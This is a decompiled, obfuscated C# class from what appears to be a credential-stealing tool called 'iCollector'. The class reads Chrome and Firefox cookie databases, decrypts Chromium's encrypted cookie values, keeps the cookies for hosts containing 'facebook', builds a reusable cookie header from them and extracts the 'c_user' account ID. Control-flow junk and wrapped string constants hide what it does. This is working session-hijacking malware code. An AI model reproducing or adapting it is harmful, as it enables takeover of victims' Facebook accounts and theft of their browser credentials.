using System;
using System.Collections.Generic;
using System.Linq;
using iCollector.Job.Model;
using iCollector.Util;
using Microsoft.Data.Sqlite;

namespace iCollector.Job.Handler;

internal class ReadIDHeaderHandler
{
	private static string CLAZZ_NAME_SE = "ReadIDHeaderHandler";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private static readonly string Q1_SE = "select name, path, expires_utc, is_secure, is_httponly, host_key, encrypted_value, top_frame_site_key, samesite, has_expires from cookies";

	private static readonly string Q1 = SecurityUtils.ReadStructEncrypted(Q1_SE);

	private static readonly string Q2_SE;

	private static readonly string Q2;

	private static readonly string Q3_SE;

	private static readonly string Q3;

	private static readonly string ID_HEADER_HOST_SE;

	private static readonly string ID_HEADER_HOST;

	private static readonly string EXCEPT_KEY_SE;

	private static readonly string EXCEPT_KEY;

	private static readonly string UID_KEY_SE;

	private static readonly string UID_KEY;

	private static readonly string KEY_NAME_SE;

	private static readonly string KEY_NAME;

	private static readonly string KEY_VALUE_SE;

	private static readonly string KEY_VALUE;

	private static readonly string KEY_HOST_SE;

	private static readonly string KEY_HOST;

	private static readonly string KEY_PATH_SE;

	private static readonly string KEY_PATH;

	private static readonly string KEY_EXPIRY_SE;

	private static readonly string KEY_EXPIRY;

	private static readonly string KEY_SECURE_SE;

	private static readonly string KEY_SECURE;

	private static readonly string KEY_HTTP_SE;

	private static readonly string KEY_HTTP;

	private static readonly string KEY_TOP_FRAME_SE;

	private static readonly string KEY_TOP_FRAME;

	private static readonly string KEY_SAMESITE_SE;

	private static readonly string KEY_SAMESITE;

	private static readonly string KEY_EXPIRES_SE;

	private static readonly string KEY_EXPIRES;

	private static readonly string LOG_01_1_SE;

	private static readonly string LOG_01_1;

	private static readonly string LOG_02_1_SE;

	private static readonly string LOG_02_1;

	private static readonly string LOG_03_1_SE;

	private static readonly string LOG_03_1;

	private static readonly string LOG_04_1_SE;

	private static readonly string LOG_04_1;

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	public void Enrich(CKModel model)
	{
		if (model.Profiles == null || (0 == 0 && model.Profiles.Count == 0))
		{
			return;
		}
		List<CKProfile>.Enumerator enumerator = model.Profiles.GetEnumerator();
		List<CKProfile>.Enumerator enumerator2;
		if (5u != 0)
		{
			enumerator2 = enumerator;
		}
		try
		{
			CKProfile cKProfile = default(CKProfile);
			int num = default(int);
			while (enumerator2.MoveNext())
			{
				CKProfile current = enumerator2.Current;
				if (0 == 0 && 0 == 0)
				{
					cKProfile = current;
				}
				if (1 == 0)
				{
					continue;
				}
				Logger logger = log;
				LogContext logContext = ctx;
				string message = LOG_01_1 + cKProfile.Path;
				if (0 == 0 && 0 == 0)
				{
					logger.Info(logContext, message);
				}
				if (5u != 0)
				{
					CKProfile cKProfile2 = cKProfile;
					List<DynamicObject> idHeaderValues = new List<DynamicObject>();
					if (uint.MaxValue != 0)
					{
						cKProfile2.IdHeaderValues = idHeaderValues;
					}
					if (string.IsNullOrEmpty(cKProfile.IdHeaderPath))
					{
						continue;
					}
					if (!string.Equals(model.Type, CKType.ZIF))
					{
						CKProfile profile = cKProfile;
						if (0 == 0)
						{
							HCBRead(model, profile);
						}
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						string lOG_02_ = LOG_02_1;
						int count = cKProfile.IdHeaderValues.Count;
						if (0 == 0)
						{
							num = count;
						}
						string message2 = lOG_02_ + num;
						if (5u != 0)
						{
							logger2.Info(logContext2, message2);
						}
						continue;
					}
					goto IL_0099;
				}
				goto IL_00dd;
				IL_0099:
				CKProfile profile2 = cKProfile;
				if (0 == 0)
				{
					ZIFRead(model, profile2);
				}
				Logger logger3 = log;
				LogContext logContext3 = ctx;
				string lOG_02_2 = LOG_02_1;
				int count2 = cKProfile.IdHeaderValues.Count;
				if (8u != 0)
				{
					num = count2;
				}
				string message3 = lOG_02_2 + num;
				if (6u != 0)
				{
					logger3.Info(logContext3, message3);
				}
				goto IL_00dd;
				IL_00dd:
				if (6u != 0)
				{
					continue;
				}
				goto IL_0099;
			}
		}
		finally
		{
			((IDisposable)enumerator2).Dispose();
		}
	}

	private void ZIFRead(CKModel model, CKProfile profile)
	{
		try
		{
			DataSourceHelper.ExecuteQuery(profile.IdHeaderPath, Q3, CreateConsumerZIF(model, profile), -1);
		}
		catch (Exception ex)
		{
			do
			{
				log.Error(ctx, ex.ToString());
			}
			while (4 == 0);
		}
		List<DynamicObject> resourceIdHeaderValues = (from item in profile.IdHeaderValues.AsEnumerable()
			where IsIdHeaderWeNeed(item)
			select item).ToList();
		if (0 == 0 && 0 == 0)
		{
			profile.ResourceIdHeaderValues = resourceIdHeaderValues;
		}
		string resourceIdHeader = string.Join(';', (from item in profile.ResourceIdHeaderValues.AsEnumerable()
			select item.GetString(KEY_NAME) + "=" + item.GetString(KEY_VALUE)).ToList());
		if (0 == 0 && 0 == 0)
		{
			profile.ResourceIdHeader = resourceIdHeader;
		}
		string? text = (from item in profile.ResourceIdHeaderValues.AsEnumerable()
			where string.Equals(item.GetString(KEY_NAME), UID_KEY)
			select item.GetString(KEY_VALUE)).FirstOrDefault();
		string text2 = default(string);
		if (0 == 0 && uint.MaxValue != 0)
		{
			text2 = text;
		}
		if (!string.IsNullOrEmpty(text2))
		{
			string resourceUID = text2;
			if (5u != 0 && 0 == 0)
			{
				profile.ResourceUID = resourceUID;
			}
		}
		Logger logger = log;
		LogContext logContext = ctx;
		string message = LOG_03_1 + profile.ResourceIdHeader;
		if (true && 7u != 0)
		{
			logger.Info(logContext, message);
		}
	}

	private Consumer<SqliteDataReader>.Accept CreateConsumerZIF(CKModel model, CKProfile profile)
	{
		CKProfile profile2 = profile;
		return delegate(SqliteDataReader reader)
		{
			try
			{
				new DynamicObject();
				string @string = reader.GetString(0);
				string value;
				if (6u != 0)
				{
					value = @string;
				}
				string string2 = reader.GetString(1);
				string text = default(string);
				if (0 == 0)
				{
					text = string2;
				}
				long num = reader.GetInt64(2) / 1000;
				long num2;
				if (4u != 0)
				{
					num2 = num;
				}
				int @int = reader.GetInt32(3);
				int num3 = default(int);
				string text2 = default(string);
				string text3 = default(string);
				if (7u != 0 && 0 == 0)
				{
					if (2u != 0)
					{
						num3 = @int;
					}
					if (1 == 0)
					{
						goto IL_00c1;
					}
					reader.GetInt32(4);
					string string3 = reader.GetString(5);
					if (3u != 0)
					{
						text2 = string3;
					}
					string string4 = reader.GetString(6);
					if (0 == 0)
					{
						text3 = string4;
					}
					@int = reader.GetInt32(7);
				}
				int num4 = default(int);
				if (true)
				{
					num4 = @int;
				}
				goto IL_0080;
				IL_0080:
				DynamicObject dynamicObject = new DynamicObject();
				DynamicObject dynamicObject2 = default(DynamicObject);
				if (0 == 0)
				{
					dynamicObject2 = dynamicObject;
				}
				DynamicObject dynamicObject3 = dynamicObject2;
				string kEY_NAME = KEY_NAME;
				if (2u != 0)
				{
					dynamicObject3.Put(kEY_NAME, value);
				}
				DynamicObject dynamicObject4 = dynamicObject2;
				string kEY_VALUE = KEY_VALUE;
				string value2 = text3;
				if (6u != 0)
				{
					dynamicObject4.Put(kEY_VALUE, value2);
				}
				DynamicObject dynamicObject5 = dynamicObject2;
				string kEY_HOST = KEY_HOST;
				string value3 = text2;
				if (0 == 0)
				{
					dynamicObject5.Put(kEY_HOST, value3);
				}
				goto IL_00c1;
				IL_00c1:
				DynamicObject dynamicObject6 = dynamicObject2;
				string kEY_PATH = KEY_PATH;
				string value4 = text;
				if (true)
				{
					dynamicObject6.Put(kEY_PATH, value4);
				}
				dynamicObject2.Put(KEY_EXPIRY, num2);
				dynamicObject2.Put(KEY_SECURE, num3);
				if (0 == 0)
				{
					dynamicObject2.Put(KEY_SAMESITE, num4);
					profile2.IdHeaderValues.Add(dynamicObject2);
					return;
				}
				goto IL_0080;
			}
			catch (Exception ex)
			{
				log.Info(ctx, LOG_04_1 + ex.ToString());
			}
		};
	}

	private Consumer<SqliteDataReader>.Accept CreateConsumer(CKModel model, CKProfile profile, bool simpleQuery)
	{
		CKModel model2 = model;
		CKProfile profile2 = profile;
		return delegate(SqliteDataReader reader)
		{
			try
			{
				new DynamicObject();
				string text = WinAPI.ReadValue(DataSourceHelper.GetBytes(reader, 6), model2.LcsBytes, 3);
				string value = default(string);
				if (0 == 0)
				{
					value = text;
				}
				string @string = reader.GetString(0);
				string value2;
				if (5u != 0)
				{
					value2 = @string;
					if (7 == 0)
					{
						goto IL_010f;
					}
				}
				string string2 = reader.GetString(1);
				string value3 = default(string);
				if (8u != 0)
				{
					value3 = string2;
				}
				long @int = reader.GetInt64(2);
				long num = default(long);
				if (0 == 0 && 0 == 0)
				{
					num = @int;
				}
				int int2 = reader.GetInt32(3);
				int num2 = 1;
				int num3 = default(int);
				if (num2 != 0)
				{
					if (num2 != 0)
					{
						num3 = int2;
					}
					int2 = reader.GetInt32(4);
					num2 = 4;
				}
				int num4 = default(int);
				if (num2 != 0)
				{
					if (1 == 0)
					{
						goto IL_00bb;
					}
					num4 = int2;
				}
				string value4 = default(string);
				string value5 = default(string);
				int num5 = default(int);
				int num6 = default(int);
				if (0 == 0)
				{
					string string3 = reader.GetString(5);
					if (4u != 0)
					{
						value4 = string3;
					}
					if (0 == 0)
					{
						value5 = "";
					}
					if (3u != 0)
					{
						num5 = 0;
					}
					if (0 == 0)
					{
						num6 = 0;
					}
					if (simpleQuery)
					{
						int int3 = reader.GetInt32(7);
						if (0 == 0)
						{
							num5 = int3;
						}
						int2 = reader.GetInt32(8);
						goto IL_00bb;
					}
					value5 = reader.GetString(7);
					num5 = reader.GetInt32(8);
					num6 = reader.GetInt32(9);
					goto IL_00e0;
				}
				goto IL_0188;
				IL_0188:
				DynamicObject dynamicObject = default(DynamicObject);
				profile2.IdHeaderValues.Add(dynamicObject);
				return;
				IL_00e0:
				dynamicObject = new DynamicObject();
				dynamicObject.Put(KEY_NAME, value2);
				dynamicObject.Put(KEY_VALUE, value);
				dynamicObject.Put(KEY_HOST, value4);
				goto IL_010f;
				IL_010f:
				dynamicObject.Put(KEY_PATH, value3);
				dynamicObject.Put(KEY_EXPIRY, num);
				dynamicObject.Put(KEY_SECURE, num3);
				dynamicObject.Put(KEY_HTTP, num4);
				dynamicObject.Put(KEY_TOP_FRAME, value5);
				dynamicObject.Put(KEY_SAMESITE, num5);
				dynamicObject.Put(KEY_EXPIRES, num6);
				goto IL_0188;
				IL_00bb:
				if (8u != 0)
				{
					num6 = int2;
				}
				goto IL_00e0;
			}
			catch (Exception ex)
			{
				log.Info(ctx, LOG_04_1 + ex.ToString());
			}
		};
	}

	private void HCBRead(CKModel model, CKProfile profile)
	{
		if (!DataSourceHelper.ExecuteQuery(profile.IdHeaderPath, Q1, CreateConsumer(model, profile, simpleQuery: false), -1))
		{
			DataSourceHelper.ExecuteQuery(profile.IdHeaderPath, Q2, CreateConsumer(model, profile, simpleQuery: true), -1);
		}
		List<DynamicObject> resourceIdHeaderValues = (from item in profile.IdHeaderValues.AsEnumerable()
			where IsIdHeaderWeNeed(item)
			select item).ToList();
		if (uint.MaxValue != 0 && 0 == 0)
		{
			profile.ResourceIdHeaderValues = resourceIdHeaderValues;
		}
		string resourceIdHeader = string.Join(';', (from item in profile.ResourceIdHeaderValues.AsEnumerable()
			select item.GetString(KEY_NAME) + "=" + item.GetString(KEY_VALUE)).ToList());
		if (0 == 0 && 0 == 0)
		{
			profile.ResourceIdHeader = resourceIdHeader;
		}
		string? text = (from item in profile.ResourceIdHeaderValues.AsEnumerable()
			where string.Equals(item.GetString(KEY_NAME), UID_KEY)
			select item.GetString(KEY_VALUE)).FirstOrDefault();
		string text2;
		if (7u != 0 && uint.MaxValue != 0)
		{
			text2 = text;
		}
		if (!string.IsNullOrEmpty(text2))
		{
			if (4u != 0 && 0 == 0)
			{
				profile.ResourceUID = text2;
			}
		}
		Logger logger = log;
		LogContext logContext = ctx;
		string message = LOG_03_1 + profile.ResourceIdHeader;
		if (7u != 0 && 7u != 0)
		{
			logger.Info(logContext, message);
		}
	}

	private bool IsIdHeaderWeNeed(DynamicObject item)
	{
		string text = default(string);
		string text2 = default(string);
		string value = default(string);
		while (true)
		{
			IL_0000:
			if (1 == 0)
			{
				goto IL_005a;
			}
			string @string = item.GetString(KEY_HOST);
			if (5u != 0)
			{
				if (0 == 0)
				{
					text = @string;
				}
				if (false)
				{
					goto IL_005a;
				}
			}
			string string2 = item.GetString(KEY_TOP_FRAME);
			if (0 == 0 && 0 == 0)
			{
				text2 = string2;
			}
			string string3 = item.GetString(KEY_NAME);
			if (0 == 0)
			{
				if (0 == 0)
				{
					value = string3;
				}
				if (8 == 0)
				{
					goto IL_0067;
				}
			}
			bool num;
			while (true)
			{
				num = EXCEPT_KEY.Equals(value);
				if (5 == 0)
				{
					break;
				}
				bool num2;
				if (!num)
				{
					while (true)
					{
						num2 = string.IsNullOrEmpty(text);
						if (false)
						{
							break;
						}
						if (false)
						{
							int num3;
							if (num3 != 0)
							{
								goto IL_0000;
							}
							continue;
						}
						goto IL_0055;
					}
				}
				else
				{
				}
				return false;
				IL_0055:
				if (!num2)
				{
					if (2 == 0)
					{
						continue;
					}
					goto IL_005a;
				}
				goto IL_0067;
			}
			goto IL_007a;
			IL_0067:
			if (!string.IsNullOrEmpty(text2))
			{
				num = text2.Contains(ID_HEADER_HOST);
				goto IL_007a;
			}
			return false;
			IL_007a:
			return num;
			IL_005a:
			if (text.Contains(ID_HEADER_HOST))
			{
				break;
			}
			goto IL_0067;
		}
		return true;
	}

	static ReadIDHeaderHandler()
	{
		if (true)
		{
			Q2_SE = "select name, path, expires_utc, is_secure, is_httponly, host_key, encrypted_value, samesite, has_expires from cookies";
			Q2 = SecurityUtils.ReadStructEncrypted(Q2_SE);
			Q3_SE = "select name, path, expiry, isSecure, isHttpOnly, host, value, sameSite from moz_cookies";
			int num;
			while (true)
			{
				IL_005b:
				Q3 = SecurityUtils.ReadStructEncrypted(Q3_SE);
				if (uint.MaxValue != 0)
				{
					goto IL_006d;
				}
				goto IL_00e7;
				IL_00e7:
				KEY_VALUE = SecurityUtils.ReadStructEncrypted(KEY_VALUE_SE);
				KEY_HOST_SE = "host_key";
				KEY_HOST = SecurityUtils.ReadStructEncrypted(KEY_HOST_SE);
				KEY_PATH_SE = "path";
				KEY_PATH = SecurityUtils.ReadStructEncrypted(KEY_PATH_SE);
				goto IL_0128;
				IL_0128:
				KEY_EXPIRY_SE = "expiry";
				KEY_EXPIRY = SecurityUtils.ReadStructEncrypted(KEY_EXPIRY_SE);
				KEY_SECURE_SE = "is_secure";
				goto IL_014b;
				IL_014b:
				KEY_SECURE = SecurityUtils.ReadStructEncrypted(KEY_SECURE_SE);
				KEY_HTTP_SE = "is_httponly";
				if (false)
				{
					goto IL_00ac;
				}
				KEY_HTTP = SecurityUtils.ReadStructEncrypted(KEY_HTTP_SE);
				KEY_TOP_FRAME_SE = "top_frame_site_key";
				KEY_TOP_FRAME = SecurityUtils.ReadStructEncrypted(KEY_TOP_FRAME_SE);
				num = 0;
				while (num == 0)
				{
					KEY_SAMESITE_SE = "samesite";
					KEY_SAMESITE = SecurityUtils.ReadStructEncrypted(KEY_SAMESITE_SE);
					KEY_EXPIRES_SE = "has_expires";
					KEY_EXPIRES = SecurityUtils.ReadStructEncrypted(KEY_EXPIRES_SE);
					LOG_01_1_SE = "Read IDHeader for profile: ";
					if (false)
					{
						goto IL_005b;
					}
					LOG_01_1 = SecurityUtils.ReadStructEncrypted(LOG_01_1_SE);
					num = 0;
					if (num == 0)
					{
						goto end_IL_005b;
					}
				}
				goto IL_0128;
				IL_0077:
				if (false)
				{
					goto IL_006d;
				}
				ID_HEADER_HOST = SecurityUtils.ReadStructEncrypted(ID_HEADER_HOST_SE);
				EXCEPT_KEY_SE = "i_user";
				EXCEPT_KEY = SecurityUtils.ReadStructEncrypted(EXCEPT_KEY_SE);
				UID_KEY_SE = "c_user";
				goto IL_00ac;
				IL_006d:
				ID_HEADER_HOST_SE = "facebook";
				goto IL_0077;
				IL_00ac:
				if (7u != 0)
				{
					UID_KEY = SecurityUtils.ReadStructEncrypted(UID_KEY_SE);
					KEY_NAME_SE = "name";
					KEY_NAME = SecurityUtils.ReadStructEncrypted(KEY_NAME_SE);
					if (5 == 0)
					{
						goto IL_0077;
					}
					KEY_VALUE_SE = "value";
					goto IL_00e7;
				}
				goto IL_014b;
				continue;
				end_IL_005b:
				break;
			}
			if (num == 0)
			{
				LOG_02_1_SE = "Read IDHeader with size: ";
				LOG_02_1 = SecurityUtils.ReadStructEncrypted(LOG_02_1_SE);
				LOG_03_1_SE = "found ResourceIdHeader: ";
			}
		}
		LOG_03_1 = SecurityUtils.ReadStructEncrypted(LOG_03_1_SE);
		LOG_04_1_SE = "Read ID Header error: ";
		LOG_04_1 = SecurityUtils.ReadStructEncrypted(LOG_04_1_SE);
	}
}
